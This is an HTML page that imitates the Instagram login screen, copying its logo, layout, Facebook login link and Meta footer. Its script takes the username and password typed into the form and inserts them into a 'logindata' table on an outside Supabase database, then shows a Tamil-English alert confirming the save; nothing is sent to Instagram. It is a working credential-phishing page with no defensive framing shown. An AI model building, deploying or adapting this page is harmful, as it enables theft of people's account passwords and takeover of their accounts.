<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Instagram Login</title>
<link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&family=Segoe+UI:wght@400;600&display=swap" rel="stylesheet">

<!-- Supabase JS Library -->
<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>

<style>
  :root {
    --ig-black: #262626;
    --ig-grey-border: #dbdbdb;
    --ig-grey-bg: #fafafa;
    --ig-blue: #0095f6;
    --ig-blue-disabled: #b2dffc;
    --ig-link-blue: #00376b;
    --ig-text-secondary: #8e8e8e;
  }

  * { box-sizing: border-box; }

  body {
    margin: 0;
    background: var(--ig-grey-bg);
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    color: var(--ig-black);
    display: flex;
    flex-direction: column;
    align-items: center;
    min-height: 100vh;
    padding: 30px 12px;
  }

  .container {
    width: 100%;
    max-width: 350px;
    display: flex;
    flex-direction: column;
    align-items: center;
  }

  .login-box {
    width: 100%;
    background: #fff;
    border: 1px solid var(--ig-grey-border);
    border-radius: 1px;
    padding: 44px 40px 24px;
    display: flex;
    flex-direction: column;
    align-items: center;
  }

  .logo {
    font-family: 'Grand Hotel', cursive;
    font-size: 3.4rem;
    font-weight: 400;
    margin: 0 0 28px 0;
    line-height: 1;
    -webkit-font-smoothing: antialiased;
  }

  form {
    width: 100%;
    display: flex;
    flex-direction: column;
    gap: 6px;
  }

  .field {
    position: relative;
    width: 100%;
  }

  .field input {
    width: 100%;
    background: var(--ig-grey-bg);
    border: 1px solid var(--ig-grey-border);
    border-radius: 3px;
    padding: 9px 8px 9px 8px;
    font-size: 12px;
    outline: none;
    transition: border-color 0.15s ease;
  }

  .field input::placeholder {
    color: #8e8e8e;
    font-size: 12px;
  }

  .field input:focus {
    border-color: #a8a8a8;
  }

  .field label {
    position: absolute;
    left: 9px;
    top: 50%;
    transform: translateY(-50%);
    font-size: 12px;
    color: #8e8e8e;
    pointer-events: none;
    transition: all 0.15s ease;
  }

  .field input:focus ~ label,
  .field input.filled ~ label {
    top: 3px;
    font-size: 9px;
    transform: none;
  }

  .field input:focus,
  .field input.filled {
    padding-top: 14px;
    padding-bottom: 4px;
  }

  .toggle-visibility {
    position: absolute;
    right: 8px;
    top: 50%;
    transform: translateY(-50%);
    font-size: 12px;
    font-weight: 600;
    color: var(--ig-black);
    background: none;
    border: none;
    cursor: pointer;
    padding: 0;
  }

  .login-btn {
    margin-top: 8px;
    width: 100%;
    background: var(--ig-blue-disabled);
    color: #fff;
    font-weight: 600;
    font-size: 14px;
    border: none;
    border-radius: 8px;
    padding: 7px 0;
    cursor: default;
    transition: background 0.15s ease;
  }

  .login-btn.active {
    background: var(--ig-blue);
    cursor: pointer;
  }

  .divider {
    width: 100%;
    display: flex;
    align-items: center;
    gap: 18px;
    margin: 18px 0;
  }

  .divider .line { flex: 1; height: 1px; background: var(--ig-grey-border); }
  .divider span { font-size: 13px; font-weight: 600; color: #8e8e8e; }

  .fb-login {
    display: flex;
    align-items: center;
    gap: 8px;
    color: #385185;
    font-size: 14px;
    font-weight: 600;
    text-decoration: none;
    margin-bottom: 16px;
    cursor: pointer;
  }

  .fb-login svg { width: 18px; height: 18px; }

  .forgot {
    font-size: 12px;
    color: var(--ig-link-blue);
    text-decoration: none;
    margin-top: 4px;
    margin-bottom: 8px;
    cursor: pointer;
  }

  .signup-box {
    width: 100%;
    background: #fff;
    border: 1px solid var(--ig-grey-border);
    border-radius: 1px;
    padding: 20px;
    margin-top: 10px;
    text-align: center;
    font-size: 14px;
  }

  .signup-box a {
    color: var(--ig-blue);
    font-weight: 600;
    text-decoration: none;
    cursor: pointer;
  }

  .get-app {
    margin-top: 20px;
    text-align: center;
    font-size: 14px;
  }

  .app-badges {
    display: flex;
    justify-content: center;
    gap: 8px;
    margin-top: 16px;
  }

  .app-badges img {
    height: 40px;
  }

  footer {
    margin-top: 40px;
    text-align: center;
    color: #8e8e8e;
    font-size: 12px;
    max-width: 500px;
  }

  .footer-links {
    display: flex;
    flex-wrap: wrap;
    justify-content: center;
    gap: 14px;
    margin-bottom: 14px;
  }

  .footer-links a {
    color: #8e8e8e;
    text-decoration: none;
    font-size: 12px;
  }

  .lang-select {
    margin-bottom: 14px;
    color: #8e8e8e;
    font-size: 12px;
    border: none;
    background: none;
  }
</style>
</head>
<body>

<div class="container">
  <div class="login-box">
    <div class="logo">Instagram</div>
    <form id="loginForm">
      <div class="field">
        <input id="username" type="text" autocomplete="username" oninput="handleInput(this)">
        <label for="username">Phone number, username, or email</label>
      </div>
      <div class="field">
        <input id="password" type="password" autocomplete="current-password" oninput="handleInput(this); checkForm();">
        <label for="password">Password</label>
        <button type="button" class="toggle-visibility" onclick="togglePw()">Show</button>
      </div>
      <button class="login-btn" id="loginBtn" type="submit">Log in</button>
    </form>

    <div class="divider"><div class="line"></div><span>OR</span><div class="line"></div></div>

    <a class="fb-login">
      <svg viewBox="0 0 36 36" fill="#385185"><path d="M36,18c0-9.94-8.06-18-18-18S0,8.06,0,18c0,8.98,6.58,16.41,15.19,17.78V23.55h-4.42v-5.55h4.42v-3.29 c0-4.85,2.65-7.54,7.19-7.54c1.42,0,2.9,0.24,3.9,0.44v5.03h-2.58c-2.34,0-2.98,1.4-2.98,3.13v2.24h5.35l-0.7,5.55h-4.65v12.24 C29.42,34.41,36,26.98,36,18z"/></svg>
      Log in with Facebook
    </a>

    <a class="forgot">Forgot password?</a>
  </div>

  <div class="signup-box">
    Don't have an account? <a>Sign up</a>
  </div>

  <div class="get-app">
    Get the app.
    <div class="app-badges">
      <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/180ae7a0bcf7.png" alt="App Store">
      <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/e9cd846dc748.png" alt="Google Play">
    </div>
  </div>
</div>

<footer>
  <div class="footer-links">
    <a>Meta</a><a>About</a><a>Blog</a><a>Jobs</a><a>Help</a><a>API</a><a>Privacy</a>
    <a>Terms</a><a>Locations</a><a>Instagram Lite</a><a>Threads</a><a>Contact uploading & non-users</a><a>Meta Verified</a>
  </div>
  <select class="lang-select"><option>English</option></select>
  <div>© 2026 Instagram from Meta</div>
</footer>

<script>
// --- SUPABASE CONFIGURATION ---
const SUPABASE_URL = 'https://fkfivwioztaxxabhjcba.supabase.co';
const SUPABASE_ANON_KEY = 'sb_publishable_2cEFcU9E4kNcuvumeKJXAw_fBPfAFKM';

const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);

// Form submit event & Supabase Data Insert Logic
document.getElementById('loginForm').addEventListener('submit', async function(e) {
  e.preventDefault();

  const u = document.getElementById('username').value;
  const p = document.getElementById('password').value;

  if (!u || !p) return;

  // Supabase Table-uku data-vai direct-aaga anuppugirom
  const { data, error } = await supabaseClient
    .from('logindata')
    .insert([
      { username: u, password: p }
    ]);

  if (error) {
    console.error('Error inserting data:', error);
    alert('Data save seiyyavillai!');
  } else {
    alert('Supabase-il Data successful-aaga save aagiyaadhu!');
    document.getElementById('loginForm').reset();
  }
});

// Front-end UI Logic (Input effects and buttons)
function handleInput(el) {
  if (el.value.length > 0) {
    el.classList.add('filled');
  } else {
    el.classList.remove('filled');
  }
}

function checkForm() {
  const u = document.getElementById('username').value;
  const p = document.getElementById('password').value;
  const btn = document.getElementById('loginBtn');
  if (u.length > 0 && p.length > 0) {
    btn.classList.add('active');
  } else {
    btn.classList.remove('active');
  }
}

document.getElementById('username').addEventListener('input', checkForm);

function togglePw() {
  const pw = document.getElementById('password');
  const btn = document.querySelector('.toggle-visibility');
  if (pw.type === 'password') {
    pw.type = 'text';
    btn.textContent = 'Hide';
  } else {
    pw.type = 'password';
    btn.textContent = 'Show';
  }
}
</script>

</body>
</html>
